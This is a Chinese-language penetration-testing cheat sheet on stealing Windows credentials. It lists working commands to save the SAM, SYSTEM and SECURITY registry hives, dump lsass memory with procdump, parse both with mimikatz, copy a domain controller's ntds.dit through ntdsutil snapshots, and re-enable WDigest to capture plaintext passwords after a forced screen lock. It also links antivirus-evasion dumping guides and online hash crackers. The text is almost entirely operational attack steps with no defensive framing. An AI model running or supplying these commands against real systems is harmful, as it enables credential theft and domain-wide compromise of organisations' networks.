# Windows Hash提取

## 0x00 基础知识

- LM Hash Windows Vista和Windows Server 2008以前的系统还会使用
- NTLM Hash
- Net-NTLM Hash 网络环境下NTLM认证中的hash

[Windows下的密码hash——NTLM hash和Net-NTLM hash介绍](https://3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D)
## 0x01 离线获取Hash
### 1. 导出SAM和SYSTEM表方法
#### （1）目标主机注册表导出文件
```
reg save HKLM\SYSTEM system.hive
reg save HKLM\SAM sam.hive
reg save hklm\security security.hive
```
#### （2）通过mimikatz导出Hash

```
$ ./mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::sam /sam:sam.hive /system:system.hive
```
### 2. 导出lsass进程内存方法

#### （1）目标主机lsass.exe dump内存

[内网渗透-免杀抓取windows hash](https://www.freebuf.com/column/231880.html)介绍了一些方法，主要是为了过杀软，如果能登录3389可以直接用任务管理器右键导出lsass.exe的内存。

#### （2）通过mimikatz导出Hash
```
$ ./mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz# sekurlsa::minidump 1.bin
mimikatz# sekurlsa::loginpasswords full
```

### 3. 导出域Hash ntds,dit
```
 创建快照
ntdsutil snapshot "activate instance ntds" create quit quit
GUID 为 {aa488f5b-40c7-4044-b24f-16fd041a6de2}

# 挂载快照
ntdsutil snapshot "mount GUID" quit quit

# 复制 ntds.dit
copy C:\$SNAP_201908200435_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds.dit

# 卸载快照
ntdsutil snapshot "unmount GUID" quit quit

# 删除快照
ntdsutil snapshot "delete GUID" quit quit

# 查询快照
ntdsutil snapshot "List All" quit quit
ntdsutil snapshot "List Mounted" quit quit
 ```
## 0x02 主机获取密码

### 获取明文密码

>在 KB2871997 之前， Mimikatz 可以直接抓取明文密码。
当服务器安装 KB2871997 补丁后，系统默认禁用 Wdigest Auth ，内存（lsass进程）不再保存明文口令。Mimikatz 将读不到密码明文。
但由于一些系统服务需要用到 Wdigest Auth，所以该选项是可以手动开启的。（开启后，需要用户重新登录才能生效）

以下是支持的系统:
Windows 7
Windows 8
Windows 8.1
Windows Server 2008
Windows Server 2012
Windows Server 2012R 2

- 原理：获取到内存文件lsass.exe进程(它用于本地安全和登陆策略)中存储的明文登录密码
利用前提：拿到了admin权限的cmd，管理员用密码登录机器，并运行了lsass.exe进程，把密码保存在内存文件lsass进程中。
抓取明文：手工修改注册表 + 强制锁屏 + 等待目标系统管理员重新登录 = 截取明文密码

procdump64.exe导出lsass.dmp
```
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
```
使用本地的mimikatz.exe读取lsass.dmp
```
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" "exit"
```

## 0x03 破解 Hash 
>超好用，可惜已经停止服务了
- [Ophcrack 在线破解](https://www.objectif-securite.ch/en/ophcrack)

- [Cmd5在线破解](https://www.cmd5.com/)

## Ref

- https://3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D 
- https://uknowsec.cn/posts/notes/Mimikatz%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96.html
- [内网渗透-免杀抓取windows hash](https://www.freebuf.com/column/231880.html)
